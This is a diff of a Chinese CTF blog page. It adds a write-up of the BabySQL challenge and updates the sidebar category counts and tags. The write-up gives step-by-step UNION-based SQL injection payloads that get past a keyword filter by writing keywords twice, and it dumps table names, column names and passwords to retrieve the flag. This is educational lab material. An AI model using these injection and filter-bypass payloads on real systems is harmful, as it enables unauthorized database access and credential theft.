@@ -620,6 +620,28 @@
 <p>得到表’10ve1ysq1’的字段id,username和password</p>
 <p>?username=1’ union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1</p>
 <p>得到password，包含flag</p>
+<h2 id="极客大挑战-BabySQL"><a href="#极客大挑战-BabySQL" class="headerlink" title="[极客大挑战]BabySQL"></a>[极客大挑战]BabySQL</h2><p>先向前两个一样尝试了万能密码 没反应</p>
+<p>然后尝试order by发现报错</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810095309420.png" alt="image-20200810095309420"></p>
+<p>or被过滤</p>
+<blockquote>
+<p>双写关键字绕过</p>
+<p>有的waf只会对关键词过滤一次，这时候采用双写的方式可以绕过。</p>
+<p>　　selselectect * from user; 过滤select后变成 select * from user;</p>
+<p><a href="https://www.cnblogs.com/zllovellyo/p/12593352.html" target="_blank" rel="noopener">https://www.cnblogs.com/zllovellyo/p/12593352.html</a></p>
+</blockquote>
+<p>尝试双写关键字绕过</p>
+<p>?username=admin&amp;password=1’ oorrder bbyy 5%23</p>
+<p>得到字段数为3</p>
+<p>查看当前数据库的表名</p>
+<p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() %23</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810094723349.png" alt="image-20200810094723349"></p>
+<p>查看字段</p>
+<p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=’b4bsql’%23</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810094732805.png" alt="image-20200810094732805"></p>
+<p>查看数据，本来以为会在别的数据库里，没想到直接在password里出来了哈哈哈</p>
+<p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql%23</p>
+<p>得到flag</p>
 
       
     </div>
@@ -732,7 +754,7 @@
           <li><a class="flat-box"
             title="/categories/BUU%E5%88%B7%E9%A2%98/" href="/categories/BUU%E5%88%B7%E9%A2%98/"
             id="categoriesBUUE588B7E9A298"
-            ><div class='name'>BUU刷题</div><div class='badge'>(4)</div></a></li>
+            ><div class='name'>BUU刷题</div><div class='badge'>(5)</div></a></li>
         
           <li><a class="flat-box"
             title="/categories/CTF/" href="/categories/CTF/"
@@ -747,7 +769,7 @@
           <li><a class="flat-box"
             title="/categories/web/" href="/categories/web/"
             id="categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(2)</div></a></li>
+            ><div class='name'>web</div><div class='badge'>(5)</div></a></li>
         
           <li><a class="flat-box"
             title="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"
@@ -781,7 +803,7 @@
 
 
     <div class='content'>
-      <a href="/tags/AES/" style="font-size: 19px; color: #777">AES</a> <a href="/tags/DLP/" style="font-size: 19px; color: #777">DLP</a> <a href="/tags/ECC/" style="font-size: 14px; color: #999">ECC</a> <a href="/tags/RC4/" style="font-size: 14px; color: #999">RC4</a> <a href="/tags/RSA/" style="font-size: 24px; color: #555">RSA</a> <a href="/tags/java/" style="font-size: 19px; color: #777">java</a> <a href="/tags/knapsack/" style="font-size: 19px; color: #777">knapsack</a> <a href="/tags/mt19937/" style="font-size: 14px; color: #999">mt19937</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 19px; color: #777">sql注入</a> <a href="/tags/stream/" style="font-size: 14px; color: #999">stream</a> <a href="/tags/%E6%89%A9%E5%B1%95CRT/" style="font-size: 14px; color: #999">扩展CRT</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 24px; color: #555">杂项</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
+      <a href="/tags/AES/" style="font-size: 19px; color: #777">AES</a> <a href="/tags/DLP/" style="font-size: 19px; color: #777">DLP</a> <a href="/tags/ECC/" style="font-size: 14px; color: #999">ECC</a> <a href="/tags/RC4/" style="font-size: 14px; color: #999">RC4</a> <a href="/tags/RSA/" style="font-size: 24px; color: #555">RSA</a> <a href="/tags/crt/" style="font-size: 14px; color: #999">crt</a> <a href="/tags/flask/" style="font-size: 14px; color: #999">flask</a> <a href="/tags/http/" style="font-size: 14px; color: #999">http</a> <a href="/tags/java/" style="font-size: 19px; color: #777">java</a> <a href="/tags/knapsack/" style="font-size: 19px; color: #777">knapsack</a> <a href="/tags/mt19937/" style="font-size: 14px; color: #999">mt19937</a> <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 14px; color: #999">php伪协议</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 19px; color: #777">sql注入</a> <a href="/tags/stream/" style="font-size: 14px; color: #999">stream</a> <a href="/tags/%E6%89%A9%E5%B1%95CRT/" style="font-size: 14px; color: #999">扩展CRT</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 14px; color: #999">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 24px; color: #555">杂项</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
     </div>
   </section>
 
